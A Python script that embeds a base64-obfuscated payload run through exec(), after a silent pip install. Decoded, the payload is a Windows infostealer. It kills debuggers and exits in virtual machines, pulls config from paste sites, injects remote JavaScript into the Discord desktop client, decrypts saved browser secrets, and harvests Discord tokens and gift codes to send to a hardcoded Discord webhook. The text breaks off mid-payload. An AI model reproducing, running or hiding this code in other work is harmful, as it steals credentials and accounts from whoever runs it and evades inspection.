import sys
import os
content = """
import subprocess
import sys
subprocess.run(["cmd.exe", "/c", sys.executable, "-m", "pip", "install", "fernet"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
import base64
exec(base64.b64decode("aW1wb3J0IG9zCmltcG9ydCByZQppbXBvcnQgc3lzCmltcG9ydCB0aW1lCmltcG9ydCBzaHV0aWwKaW1wb3J0IGN0eXBlcwppbXBvcnQgd2lucmVnCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgdXJsbGliCmltcG9ydCByYW5kb20KaW1wb3J0IHdhcm5pbmdzCmltcG9ydCB0aHJlYWRpbmcKaW1wb3J0IHN1YnByb2Nlc3MKZnJvbSBzeXMgaW1wb3J0IGV4ZWN1dGFibGUsIHN0ZGVycgpmcm9tIGJhc2U2NCBpbXBvcnQgYjY0ZGVjb2RlCmZyb20ganNvbiBpbXBvcnQgbG9hZHMsIGR1bXBzCmZyb20gemlwZmlsZSBpbXBvcnQgWmlwRmlsZSwgWklQX0RFRkxBVEVECmZyb20gc3FsaXRlMyBpbXBvcnQgY29ubmVjdCBhcyBzcWxfY29ubmVjdApmcm9tIHVybGxpYi5yZXF1ZXN0IGltcG9ydCBSZXF1ZXN0LCB1cmxvcGVuCmZyb20gY3R5cGVzIGltcG9ydCB3aW5kbGwsIHdpbnR5cGVzLCBieXJlZiwgY2RsbCwgU3RydWN0dXJlLCBQT0lOVEVSLCBjX2NoYXIsIGNfYnVmZmVyCgpjbGFzcyBOdWxsV3JpdGVyKG9iamVjdCk6CiAgICBkZWYgd3JpdGUoc2VsZiwgYXJnKToKICAgICAgICBwYXNzCgp3YXJuaW5ncy5maWx0ZXJ3YXJuaW5ncygiaWdub3JlIikKbnVsbF93cml0ZXIgPSBOdWxsV3JpdGVyKCkKc3RkZXJyID0gbnVsbF93cml0ZXIKCk1vZHVsZVJlcXVpcmVtZW50cyA9IFsKICAgIFsiQ3J5cHRvLkNpcGhlciIsICJweWNyeXB0b2RvbWUiIGlmIG5vdCAnUHl0aG9uU29mdHdhcmVGb3VuZGF0aW9uJyBpbiBleGVjdXRhYmxlIGVsc2UgJ0NyeXB0byddCl0KZm9yIG1vZHVsZSBpbiBNb2R1bGVSZXF1aXJlbWVudHM6CiAgICB0cnk6IAogICAgICAgIF9faW1wb3J0X18obW9kdWxlWzBdKQogICAgZXhjZXB0OgogICAgICAgIHN1YnByb2Nlc3MuUG9wZW4oZiJcIntleGVjdXRhYmxlfVwiIC1tIHBpcCBpbnN0YWxsIHttb2R1bGVbMV19IC0tcXVpZXQiLCBzaGVsbD1UcnVlKQogICAgICAgIHRpbWUuc2xlZXAoMykKCmZyb20gQ3J5cHRvLkNpcGhlciBpbXBvcnQgQUVTCgpkZWYgYW50aWRlYnVnKCk6CiAgICBjaGVja3MgPSBbY2hlY2tfd2luZG93cywgY2hlY2tfaXAsIGNoZWNrX3JlZ2lzdHJ5LCBjaGVja19kbGxdCiAgICBmb3IgY2hlY2sgaW4gY2hlY2tzOgogICAgICAgIHQgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1jaGVjaywgZGFlbW9uPVRydWUpCiAgICAgICAgdC5zdGFydCgpCgpkZWYgZXhpdF9wcm9ncmFtKHJlYXNvbik6CiAgICBwcmludChyZWFzb24pCiAgICBjdHlwZXMud2luZGxsLmtlcm5lbDMyLkV4aXRQcm9jZXNzKDApCgpkZWYgY2hlY2tfd2luZG93cygpOgogICAgQGN0eXBlcy5XSU5GVU5DVFlQRShjdHlwZXMuY19ib29sLCBjdHlwZXMuUE9JTlRFUihjdHlwZXMuY192b2lkX3ApLCBjdHlwZXMuUE9JTlRFUihjdHlwZXMuY192b2lkX3ApKQogICAgZGVmIHdpbkVudW1IYW5kbGVyKGh3bmQsIGN0eCk6CiAgICAgICAgdGl0bGUgPSBjdHlwZXMuY3JlYXRlX3N0cmluZ19idWZmZXIoMTAyNCkKICAgICAgICBjdHlwZXMud2luZGxsLnVzZXIzMi5HZXRXaW5kb3dUZXh0QShod25kLCB0aXRsZSwgMTAyNCkKICAgICAgICBpZiB0aXRsZS52YWx1ZS5kZWNvZGUoJ1dpbmRvd3MtMTI1MicpLmxvd2VyKCkgaW4geydwcm94aWZpZXInLCAnZ3JheXdvbGYnLCAnZXh0cmVtZWR1bXBlcicsICd6ZWQnLCAnZXhlaW5mb3BlJywgJ2Ruc3B5JywgJ3RpdGFuSGlkZScsICdpbHNweScsICd0aXRhbmhpZGUnLCAneDMyZGJnJywgJ2NvZGVjcmFja2VyJywgJ3NpbXBsZWFzc2VtYmx5JywgJ3Byb2Nlc3MgaGFja2VyIDInLCAncGMtcmV0JywgJ2h0dHAgZGVidWdnZXInLCAnQ2VudG9zJywgJ3Byb2Nlc3MgbW9uaXRvcicsICdkZWJ1ZycsICdJTFNweScsICdyZXZlcnNlJywgJ3NpbXBsZWFzc2VtYmx5ZXhwbG9yZXInLCAncHJvY2VzcycsICdkZTRkb3Rtb2RkZWQnLCAnZG9qYW5kcXdrbG5kb3F3ZC14ODYnLCAnc2hhcnBvZCcsICdmb2xkZXJjaGFuZ2VzdmlldycsICdmaWRkbGVyJywgJ2RpZScsICdwaXp6YScsICdjcmFjaycsICdzdHJvbmdvZCcsICdpZGEgLScsICdicnV0ZScsICdkdW1wJywgJ1N0cmluZ0RlY3J5cHRvcicsICd3aXJlc2hhcmsnLCAnZGVidWdnZXInLCAnaHR0cGRlYnVnZ2VyJywgJ2dkYicsICdrZGInLCAneDY0X2RiZycsICd3aW5kYmcnLCAneDY0bmV0ZHVtcGVyJywgJ3BldG9vbHMnLCAnc2N5bGxhaGlkZScsICdtZWdhZHVtcGVyJywgJ3JldmVyc2FsJywgJ2tzZHVtcGVyIHYxLjEgLSBieSBlcXVpZm94JywgJ2RiZ2NscicsICdIeEQnLCAnbW9uaXRvcicsICdwZWVrJywgJ29sbHlkYmcnLCAna3NkdW1wZXInLCAnaHR0cCcsICdjc2UgcHJvJywgJ2RiZycsICdodHRwYW5hbHl6ZXInLCAnaHR0cGRlYnVnJywgJ1BoYW50T20nLCAna2dkYicsICdqYW1lcycsICd4MzJfZGJnJywgJ3Byb3h5JywgJ3BoYW50b20nLCAnbWRiZycsICdXUEUgUFJPJywgJ3N5c3RlbSBleHBsb3JlcicsICdkZTRkb3QnLCAneDY0ZGJnJywgJ1g2NE5ldER1bXBlcicsICdwcm90ZWN0aW9uX2lkJywgJ2NoYXJsZXMnLCAnc3lzdGVtZXhwbG9yZXInLCAncGVwcGVyJywgJ2h4ZCcsICdwcm9jbW9uNjQnLCAnTWVnYUR1bXBlcicsICdnaGlkcmEnLCAneGQnLCAnMGhhcm1vbnknLCAnZG9qYW5kcXdrbG5kb3F3ZCcsICdoYWNrZXInLCAncHJvY2VzcyBoYWNrZXInLCAnU0FFJywgJ21kYicsICdjaGVja2VyJywgJ2hhcm1vbnknLCAnUHJvdGVjdGlvbl9JRCcsICdQRVRvb2xzJywgJ3NjeWxsYUhpZGUnLCAneDk2ZGJnJywgJ3N5c3RlbWV4cGxvcmVyc2VydmljZScsICdmb2xkZXInLCAnbWl0bXByb3h5JywgJ2RieCcsICdzbmlmZmVyJywgJ2h0dHAgdG9vbGtpdCcsICdnZW9yZ2UnLH06CiAgICAgICAgICAgIHBpZCA9IGN0eXBlcy5jX3Vsb25nKDApCiAgICAgICAgICAgIGN0eXBlcy53aW5kbGwudXNlcjMyLkdldFdpbmRvd1RocmVhZFByb2Nlc3NJZChod25kLCBjdHlwZXMuYnlyZWYocGlkKSkKICAgICAgICAgICAgaWYgcGlkLnZhbHVlICE9IDA6CiAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgaGFuZGxlID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5PcGVuUHJvY2VzcygxLCBGYWxzZSwgcGlkKQogICAgICAgICAgICAgICAgICAgIGN0eXBlcy53aW5kbGwua2VybmVsMzIuVGVybWluYXRlUHJvY2VzcyhoYW5kbGUsIC0xKQogICAgICAgICAgICAgICAgICAgIGN0eXBlcy53aW5kbGwua2VybmVsMzIuQ2xvc2VIYW5kbGUoaGFuZGxlKQogICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgZXhpdF9wcm9ncmFtKGYnRGVidWdnZXIgT3BlbiwgVHlwZToge3RpdGxlLnZhbHVlLmRlY29kZSgidXRmLTgiKX0nKQogICAgICAgIHJldHVybiBUcnVlCgogICAgd2hpbGUgVHJ1ZToKICAgICAgICBjdHlwZXMud2luZGxsLnVzZXIzMi5FbnVtV2luZG93cyh3aW5FbnVtSGFuZGxlciwgTm9uZSkKICAgICAgICB0aW1lLnNsZWVwKDAuNSkKZGVmIGNoZWNrX2lwKCk6CiAgICBibGFja2xpc3RlZCA9IHsnODguMTMyLjIyNy4yMzgnLCAnNzkuMTA0LjIwOS4zMycsICc5Mi4yMTEuNTIuNjInLCAnMjAuOTkuMTYwLjE3MycsICcxODguMTA1LjkxLjE3MycsICc2NC4xMjQuMTIuMTYyJywgJzE5NS4xODEuMTc1LjEwNScsICcxOTQuMTU0Ljc4LjE2MCcsICAnMTA5Ljc0LjE1NC45MicsICc4OC4xNTMuMTk5LjE2OScsICczNC4xNDUuMTk1LjU4JywgJzE3OC4yMzkuMTY1LjcwJywgJzg4LjEzMi4yMzEuNzEnLCAnMzQuMTA1LjE4My42OCcsICcxOTUuNzQuNzYuMjIyJywgJzE5Mi44Ny4yOC4xMDMnLCAnMzQuMTQxLjI0NS4yNScsICczNS4xOTkuNi4xMycsICczNC4xNDUuODkuMTc0JywgJzM0LjE0MS4xNDYuMTE0JywgJzk1LjI1LjIwNC45MCcsICc4Ny4xNjYuNTAuMjEzJywgJzE5My4yMjUuMTkzLjIwMScsICc5Mi4yMTEuNTUuMTk5JywgJzM1LjIyOS42OS4yMjcnLCAnMTA0LjE4LjEyLjM4JywgJzg4LjEzMi4yMjUuMTAwJywgJzIxMy4zMy4xNDIuNTAnLCAnMTk1LjIzOS41MS41OScsICczNC44NS4yNDMuMjQxJywgJzM1LjIzNy40Ny4xMicsICczNC4xMzguOTYuMjMnLCAnMTkzLjEyOC4xMTQuNDUnLCAnMTA5LjE0NS4xNzMuMTY5JywgJzE4OC4xMDUuOTEuMTE2JywgJ05vbmUnLCAnODAuMjExLjAuOTcnLCAnODQuMTQ3LjYyLjEyJywgJzc4LjEzOS44LjUwJywgJzEwOS43NC4xNTQuOTAnLCAnMzQuODMuNDYuMTMwJywgJzIxMi4xMTkuMjI3LjE2NycsICc5Mi4yMTEuMTA5LjE2MCcsICc5My4yMTYuNzUuMjA5JywgJzM0LjEwNS43Mi4yNDEnLCAnMjEyLjExOS4yMjcuMTUxJywgJzEwOS43NC4xNTQuOTEnLCAnOTUuMjUuODEuMjQnLCAnMTg4LjEwNS45MS4xNDMnLCAnMTkyLjIxMS4xMTAuNzQnLCAnMzQuMTQyLjc0LjIyMCcsICczNS4xOTIuOTMuMTA3JywgJzg4LjEzMi4yMjYuMjAzJywgJzM0Ljg1LjI1My4xNzAnLCAnMzQuMTA1LjAuMjcnLCAnMTk1LjIzOS41MS4zJywgJzE5Mi40MC41Ny4yMzQnLCAnOTIuMjExLjE5Mi4xNDQnLCAnMjMuMTI4LjI0OC40NicsICc4NC4xNDcuNTQuMTEzJywgJzM0LjI1My4yNDguMjI4JyxOb25lfSAgICAKICAgIHdoaWxlIFRydWU6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBpcCA9IHVybGxpYi5yZXF1ZXN0LnVybG9wZW4oJ2h0dHBzOi8vY2hlY2tpcC5hbWF6b25hd3MuY29tJykucmVhZCgpLmRlY29kZSgpLnN0cmlwKCkKICAgICAgICAgICAgaWYgaXAgaW4gYmxhY2tsaXN0ZWQ6CiAgICAgICAgICAgICAgICBleGl0X3Byb2dyYW0oJ0JsYWNrbGlzdGVkIElQIERldGVjdGVkJykKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwYXNzCgpkZWYgY2hlY2tfcmVnaXN0cnkoKToKICAgIHRyeToKICAgICAgICBrZXkgPSB3aW5yZWcuT3BlbktleSh3aW5yZWcuSEtFWV9MT0NBTF9NQUNISU5FLCByJ1NZU1RFTVxDdXJyZW50Q29udHJvbFNldFxFbnVtXElERScsIDAsIHdpbnJlZy5LRVlfUkVBRCkKICAgICAgICBzdWJrZXlfY291bnQgPSB3aW5yZWcuUXVlcnlJbmZvS2V5KGtleSlbMF0KICAgICAgICBmb3IgaSBpbiByYW5nZShzdWJrZXlfY291bnQpOgogICAgICAgICAgICBzdWJrZXkgPSB3aW5yZWcuRW51bUtleShrZXksIGkpCiAgICAgICAgICAgIGlmIHN1YmtleS5zdGFydHN3aXRoKCdWTVdBUkUnKToKICAgICAgICAgICAgICAgIGV4aXRfcHJvZ3JhbSgnVk0gRGV0ZWN0ZWQnKQogICAgICAgIHdpbnJlZy5DbG9zZUtleShrZXkpCiAgICBleGNlcHQ6CiAgICAgICAgcGFzcwoKZGVmIGNoZWNrX2RsbCgpOgogICAgc3lzX3Jvb3QgPSBvcy5lbnZpcm9uLmdldCgnU3lzdGVtUm9vdCcsICdDOlxcV2luZG93cycpCiAgICBpZiBvcy5wYXRoLmV4aXN0cyhvcy5wYXRoLmpvaW4oc3lzX3Jvb3QsICJTeXN0ZW0zMlxcdm1HdWVzdExpYi5kbGwiKSkgb3Igb3MucGF0aC5leGlzdHMob3MucGF0aC5qb2luKHN5c19yb290LCAidmJveG1yeG5wLmRsbCIpKToKICAgICAgICBleGl0X3Byb2dyYW0oJ1ZNIERldGVjdGVkJykKCmNuYW1lID0gImh0dHBzOi8vcmVudHJ5LmNvL3U0dHVwL3JhdyIKY25hbWVyZXNwID0gcmVxdWVzdHMuZ2V0KGNuYW1lKQpjbmFtZSA9IGNuYW1lcmVzcC50ZXh0CgpzbWFsbGNuYW1lID0gImh0dHBzOi8vcmVudHJ5LmNvLzVjcmN1L3JhdyIKc21hbGxjbmFtZXJlc3AgPSByZXF1ZXN0cy5nZXQoc21hbGxjbmFtZSkKc21hbGxjbmFtZSA9IHNtYWxsY25hbWVyZXNwLnRleHQKCmZvb3RlcmMgPSAiaHR0cHM6Ly9yZW50cnkuY28vcG1weGEvcmF3Igpmb290ZXJjcmVzcCA9IHJlcXVlc3RzLmdldChmb290ZXJjKQpmb290ZXJjID0gZm9vdGVyY3Jlc3AudGV4dAoKd29yZHMgPSAiaHR0cHM6Ly9yZW50cnkuY28vNXV1OTkvcmF3Igp3b3Jkc3Jlc3AgPSByZXF1ZXN0cy5nZXQod29yZHMpCndvcmRzID0gd29yZHNyZXNwLnRleHQKCmgwMGsgPSAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI0ODAxMjY3ODgxNTgwOTU3Ny84ckR2Y1lOclM0dEpYYndKOG5rSEdsUWd5SzEyVjRTVlRra3dEaEJBVGpXUEh5ZXdNRFNoRENrV19NWkFYQUdoYUpBWiIKaW5qM2M3MTBuX3VybCA9IGYiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3d0ZntjbmFtZX13dGYvaW5kZXgvbWFpbi9pbmplY3Rpb24uanMiCgpjbGFzcyBEQVRBX0JMT0IoU3RydWN0dXJlKToKICAgIF9maWVsZHNfID0gWwogICAgICAgICgnY2JEYXRhJywgd2ludHlwZXMuRFdPUkQpLAogICAgICAgICgncGJEYXRhJywgUE9JTlRFUihjX2NoYXIpKQogICAgXQoKZGVmIEczNzFQKCk6CiAgICB0cnk6cmV0dXJuIHVybG9wZW4oUmVxdWVzdCgiaHR0cHM6Ly9hcGkuaXBpZnkub3JnIikpLnJlYWQoKS5kZWNvZGUoKS5zdHJpcCgpCiAgICBleGNlcHQ6cmV0dXJuICJOb25lIgoKZGVmIFoxUEYwMUQzcihmb2xkZXJuYW1lLCB0YXJnZXRfZGlyKTogICAgICAgICAgICAKICAgIHppcG9iaiA9IFppcEZpbGUodGVtcCsiLyIrZm9sZGVybmFtZSArICcuemlwJywgJ3cnLCBaSVBfREVGTEFURUQpCiAgICByb290bGVuID0gbGVuKHRhcmdldF9kaXIpICsgMQogICAgZm9yIGJhc2UsIGRpcnMsIGZpbGVzIGluIG9zLndhbGsodGFyZ2V0X2Rpcik6CiAgICAgICAgZm9yIGZpbGUgaW4gZmlsZXM6CiAgICAgICAgICAgIGZuID0gb3MucGF0aC5qb2luKGJhc2UsIGZpbGUpCiAgICAgICAgICAgIGlmIG5vdCAidXNlcl9kYXRhIiBpbiBmbjoKICAgICAgICAgICAgICAgIHppcG9iai53cml0ZShmbiwgZm5bcm9vdGxlbjpdKQoKZGVmIEczN0Q0NzQoYmxvYl9vdXQpOgogICAgY2JEYXRhID0gaW50KGJsb2Jfb3V0LmNiRGF0YSkKICAgIHBiRGF0YSA9IGJsb2Jfb3V0LnBiRGF0YQogICAgYnVmZmVyID0gY19idWZmZXIoY2JEYXRhKQogICAgY2RsbC5tc3ZjcnQubWVtY3B5KGJ1ZmZlciwgcGJEYXRhLCBjYkRhdGEpCiAgICB3aW5kbGwua2VybmVsMzIuTG9jYWxGcmVlKHBiRGF0YSkKICAgIHJldHVybiBidWZmZXIucmF3CgpkZWYgQ3J5cHRVbnByb3RlY3REYXRhKGVuY3J5cHRlZF9ieXRlcywgZW50cm9weT1iJycpOgogICAgYnVmZmVyX2luID0gY19idWZmZXIoZW5jcnlwdGVkX2J5dGVzLCBsZW4oZW5jcnlwdGVkX2J5dGVzKSkKICAgIGJ1ZmZlcl9lbnRyb3B5ID0gY19idWZmZXIoZW50cm9weSwgbGVuKGVudHJvcHkpKQogICAgYmxvYl9pbiA9IERBVEFfQkxPQihsZW4oZW5jcnlwdGVkX2J5dGVzKSwgYnVmZmVyX2luKQogICAgYmxvYl9lbnRyb3B5ID0gREFUQV9CTE9CKGxlbihlbnRyb3B5KSwgYnVmZmVyX2VudHJvcHkpCiAgICBibG9iX291dCA9IERBVEFfQkxPQigpCgogICAgaWYgd2luZGxsLmNyeXB0MzIuQ3J5cHRVbnByb3RlY3REYXRhKGJ5cmVmKGJsb2JfaW4pLCBOb25lLCBieXJlZihibG9iX2VudHJvcHkpLCBOb25lLCBOb25lLCAweDAxLCBieXJlZihibG9iX291dCkpOgogICAgICAgIHJldHVybiBHMzdENDc0KGJsb2Jfb3V0KQoKZGVmIEQzQ3JZUDdWNDFVMyhidWZmLCBtYXN0ZXJfa2V5PU5vbmUpOgogICAgICAgIHN0YXJ0cyA9IGJ1ZmYuZGVjb2RlKGVuY29kaW5nPSd1dGY4JywgZXJyb3JzPSdpZ25vcmUnKVs6M10KICAgICAgICBpZiBzdGFydHMgPT0gJ3YxMCcgb3Igc3RhcnRzID09ICd2MTEnOgogICAgICAgICAgICBpdiA9IGJ1ZmZbMzoxNV0KICAgICAgICAgICAgcGF5bG9hZCA9IGJ1ZmZbMTU6XQogICAgICAgICAgICBjaXBoZXIgPSBBRVMubmV3KG1hc3Rlcl9rZXksIEFFUy5NT0RFX0dDTSwgaXYpCiAgICAgICAgICAgIGRlY3J5cHRlZF9wYXNzID0gY2lwaGVyLmRlY3J5cHQocGF5bG9hZCkKICAgICAgICAgICAgZGVjcnlwdGVkX3Bhc3MgPSBkZWNyeXB0ZWRfcGFzc1s6LTE2XQogICAgICAgICAgICB0cnk6IGRlY3J5cHRlZF9wYXNzID0gZGVjcnlwdGVkX3Bhc3MuZGVjb2RlKCkKICAgICAgICAgICAgZXhjZXB0OnBhc3MKICAgICAgICAgICAgcmV0dXJuIGRlY3J5cHRlZF9wYXNzCgpkZWYgTDA0RFVyMTE4KGgwMGssIGRhdGE9JycsIGhlYWRlcnM9JycpOgogICAgZm9yIGkgaW4gcmFuZ2UoOCk6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBpZiBoZWFkZXJzICE9ICcnOgogICAgICAgICAgICAgICAgciA9IHVybG9wZW4oUmVxdWVzdChoMDBrLCBkYXRhPWRhdGEsIGhlYWRlcnM9aGVhZGVycykpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICByID0gdXJsb3BlbihSZXF1ZXN0KGgwMGssIGRhdGE9ZGF0YSkpCiAgICAgICAgICAgIHJldHVybiByCiAgICAgICAgZXhjZXB0OiAKICAgICAgICAgICBwYXNzCgpkZWYgRzEwODQxMU5GMCgpOgogICAgdHJ5OgogICAgICAgIHVzZXJuYW1lID0gb3MuZ2V0ZW52KCJVU0VSTkFNRSIpCiAgICAgICAgaXBkYXRhbm9qc29uID0gdXJsb3BlbihSZXF1ZXN0KGYiaHR0cHM6Ly9nZW9sb2NhdGlvbi1kYi5jb20vanNvbnAve0lQfSIpKS5yZWFkKCkuZGVjb2RlKCkucmVwbGFjZSgnY2FsbGJhY2soJywgJycpLnJlcGxhY2UoJ30pJywgJ30nKQogICAgICAgIGlwZGF0YSA9IGxvYWRzKGlwZGF0YW5vanNvbikKICAgICAgICBjb250cnkgPSBpcGRhdGFbImNvdW50cnlfbmFtZSJdCiAgICAgICAgY29udHJ5Q29kZSA9IGlwZGF0YVsiY291bnRyeV9jb2RlIl0ubG93ZXIoKQogICAgICAgIGlmIGNvbnRyeUNvZGUgPT0gIm5vdCBmb3VuZCI6CiAgICAgICAgICAgIGdsb2JhbGluZm8gPSBmIjpyYWluYm93X2ZsYWc6ICAtIGB7dXNlcm5hbWUudXBwZXIoKX0gfCB7SVB9ICh7Y29udHJ5fSlgIgogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGdsb2JhbGluZm8gPSBmIjpmbGFnX3tjb250cnlDb2RlfTogIC0gYHt1c2VybmFtZS51cHBlcigpfSB8IHtJUH0gKHtjb250cnl9KWAiCiAgICAgICAgcmV0dXJuIGdsb2JhbGluZm8KCiAgICBleGNlcHQ6CiAgICAgICAgcmV0dXJuIGYiOnJhaW5ib3dfZmxhZzogIC0gYHt1c2VybmFtZS51cHBlcigpfWAiCgpkZWYgVHJVNTcoQzAwSzEzcyk6CiAgICBnbG9iYWwgREVURUNURUQKICAgIGRhdGEgPSBzdHIoQzAwSzEzcykKICAgIHRpbSA9IHJlLmZpbmRhbGwoIi5nb29nbGUuY29tIiwgZGF0YSkKICAgIERFVEVDVEVEID0gVHJ1ZSBpZiBsZW4odGltKSA8IC0xIGVsc2UgRmFsc2UKICAgIHJldHVybiBERVRFQ1RFRAoKZGVmIGluajNjNzEwbigpOgoKICAgIHVzZXJuYW1lID0gb3MuZ2V0bG9naW4oKQoKICAgIGZvbGRlcl9saXN0ID0gWydEaXNjb3JkJywgJ0Rpc2NvcmRDYW5hcnknLCAnRGlzY29yZFBUQicsICdEaXNjb3JkRGV2ZWxvcG1lbnQnXQoKICAgIGZvciBmb2xkZXJfbmFtZSBpbiBmb2xkZXJfbGlzdDoKICAgICAgICBkZW5lbWVfcGF0aCA9IG9zLnBhdGguam9pbihvcy5nZXRlbnYoJ0xPQ0FMQVBQREFUQScpLCBmb2xkZXJfbmFtZSkKICAgICAgICBpZiBvcy5wYXRoLmlzZGlyKGRlbmVtZV9wYXRoKToKICAgICAgICAgICAgZm9yIHN1YmRpciwgZGlycywgZmlsZXMgaW4gb3Mud2FsayhkZW5lbWVfcGF0aCk6CiAgICAgICAgICAgICAgICBpZiAnYXBwLScgaW4gc3ViZGlyOgogICAgICAgICAgICAgICAgICAgIGZvciBkaXIgaW4gZGlyczoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgJ21vZHVsZXMnIGluIGRpcjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1vZHVsZV9wYXRoID0gb3MucGF0aC5qb2luKHN1YmRpciwgZGlyKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHN1YnN1YmRpciwgc3ViZGlycywgc3ViZmlsZXMgaW4gb3Mud2Fsayhtb2R1bGVfcGF0aCk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgJ2Rpc2NvcmRfZGVza3RvcF9jb3JlLScgaW4gc3Vic3ViZGlyOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3Igc3Vic3Vic3ViZGlyLCBzdWJzdWJkaXJzLCBzdWJzdWJmaWxlcyBpbiBvcy53YWxrKHN1YnN1YmRpcik6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAnZGlzY29yZF9kZXNrdG9wX2NvcmUnIGluIHN1YnN1YnN1YmRpcjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgZmlsZSBpbiBzdWJzdWJmaWxlczoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZmlsZSA9PSAnaW5kZXguanMnOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZV9wYXRoID0gb3MucGF0aC5qb2luKHN1YnN1YnN1YmRpciwgZmlsZSkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbmplQ1RtRUQwY1Qwcl9jb250ID0gcmVxdWVzdHMuZ2V0KGluajNjNzEwbl91cmwpLnRleHQKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbmplQ1RtRUQwY1Qwcl9jb250ID0gaW5qZUNUbUVEMGNUMHJfY29udC5yZXBsYWNlKCIlV0VCSE9PSyUiLCBoMDBrKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbihmaWxlX3BhdGgsICJ3IiwgZW5jb2Rpbmc9InV0Zi04IikgYXMgaW5kZXhfZmlsZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbmRleF9maWxlLndyaXRlKGluamVDVG1FRDBjVDByX2NvbnQpCmluajNjNzEwbigpCgpkZWYgRzM3QzBEMzUodG9rZW4pOgogICAgdHJ5OgogICAgICAgIGNvZGVzID0gIiIKICAgICAgICBoZWFkZXJzID0geyJBdXRob3JpemF0aW9uIjogdG9rZW4sIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDIuMCJ9CiAgICAgICAgY29kZXNzID0gbG9hZHModXJsb3BlbihSZXF1ZXN0KCJodHRwczovL2Rpc2NvcmQuY29tL2FwaS92OS91c2Vycy9AbWUvb3V0Ym91bmQtcHJvbW90aW9ucy9jb2Rlcz9sb2NhbGU9ZW4tR0IiLCBoZWFkZXJzPWhlYWRlcnMpKS5yZWFkKCkuZGVjb2RlKCkpCgogICAgICAgIGZvciBjb2RlIGluIGNvZGVzczoKICAgICAgICAgICAgdHJ5OmNvZGVzICs9IGYiPDpibGFja19naWZ0OjExODQ5NzEwOTUwMDMxMDc0NTE+ICoqe3N0cihjb2RlWydwcm9tb3Rpb24nXVsnb3V0Ym91bmRfdGl0bGUnXSl9Kipcbjw6UmlnaHRkb3duOjg5MTM1NTY0NjQ3NjI5NjI3Mj4gYHtzdHIoY29kZVsnY29kZSddKX1gXG4iCiAgICAgICAgICAgIGV4Y2VwdDpwYXNzCgogICAgICAgIG5pdHJvY29kZXNzID0gbG9hZHModXJsb3BlbihSZXF1ZXN0KCJodHRwczovL2Rpc2NvcmQuY29tL2FwaS92OS91c2Vycy9AbWUvZW50aXRsZW1lbnRzL2dpZnRzP2xvY2FsZT1lbi1HQiIsIGhlYWRlcnM9aGVhZGVycykpLnJlYWQoKS5kZWNvZGUoKSkKICAgICAgICBpZiBuaXRyb2NvZGVzcyA9PSBbXTogcmV0dXJuIGNvZGVzCgogICAgICAgIGZvciBlbGVtZW50IGluIG5pdHJvY29kZXNzOgogICAgICAgICAgICAKICAgICAgICAgICAgc2t1X2lkID0gZWxlbWVudFsnc2t1X2lkJ10KICAgICAgICAgICAgc3Vic2NyaXB0aW9uX3BsYW5faWQgPSBlbGVtZW50WydzdWJzY3JpcHRpb25fcGxhbiddWydpZCddCiAgICAgICAgICAgIG5hbWUgPSBlbGVtZW50WydzdWJzY3JpcHRpb25fcGxhbiddWyduYW1lJ10KCiAgICAgICAgICAgIHVybCA9IGYiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjkvdXNlcnMvQG1lL2VudGl0bGVtZW50cy9naWZ0LWNvZGVzP3NrdV9pZD17c2t1X2lkfSZzdWJzY3JpcHRpb25fcGxhbl9pZD17c3Vic2NyaXB0aW9uX3BsYW5faWR9IgogICAgICAgICAgICBuaXRycnJybyA9IGxvYWRzKHVybG9wZW4oUmVxdWVzdCh1cmwsIGhlYWRlcnM9aGVhZGVycykpLnJlYWQoKS5kZWNvZGUoKSkKCiAgICAgICAgICAgIGZvciBlbCBpbiBuaXRycnJybzoKICAgICAgICAgICAgICAgIGNvZCA9IGVsWydjb2RlJ10KICAgICAgICAgICAgICAgIHRyeTpjb2RlcyArPSBmIjw6YmxhY2tfZ2lmdDoxMTg0OTcxMDk1MDAzMTA3NDUxPiAqKntuYW1lfSoqXG48OlJpZ2h0ZG93bjo4OTEzNTU2NDY0NzYyOTYyNzI+IGBodHRwczovL2Rpc2NvcmQuZ2lmdC97Y29kfWBcbiIKICAgICAgICAgICAgICAgIGV4Y2VwdDpwYXNzCiAgICAgICAgcmV0dXJuIGNvZGVzCiAgICBleGNlcHQ6cmV0dXJuICIiCgpkZWYgRzM3